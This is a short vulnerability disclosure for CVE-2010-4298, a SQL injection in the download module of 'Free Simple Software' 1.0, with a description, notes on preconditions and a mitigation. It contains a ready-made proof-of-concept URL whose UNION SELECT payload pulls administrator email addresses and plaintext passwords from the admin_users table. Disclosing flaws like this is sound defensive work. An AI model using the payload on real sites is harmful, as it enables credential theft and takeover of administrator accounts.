'Free Simple Software' SQL Injection Vulnerability (CVE-2010-4298)
Mark Stanislav - mark.stanislav@gmail.com


I. DESCRIPTION
---------------------------------------
A vulnerability exists in the 'Free Simple Software' download module which allows for a 'UNION SELECT' to easily expose the application administrator's plaintext password.


II. TESTED VERSION
---------------------------------------
1.0 [Manual Install Version]


III. PoC EXPLOIT
---------------------------------------
http://site.com/index.php?page=downloads&request=download_now&downloads_id=' UNION SELECT email_address as name, NULL, NULL, password as file_name, last_name as file_url from admin_users where id!='NULL


IV. NOTES
---------------------------------------
* User passwords for this web application are not encrypted or hashed which makes this exploit even more concerning.
* The PoC assumes that the first user is the administrative user which is the default behavior for the application.
* At least 1 download must already exist to enable this exploit.
* Due to a previous vulnerability not being fixed 3-months after disclosure (CVE-2010-3307), it's assumable that this application is not being actively developed.


V. SOLUTION
---------------------------------------
Do not utilize the download module. No patch/upgrade is available at this time.
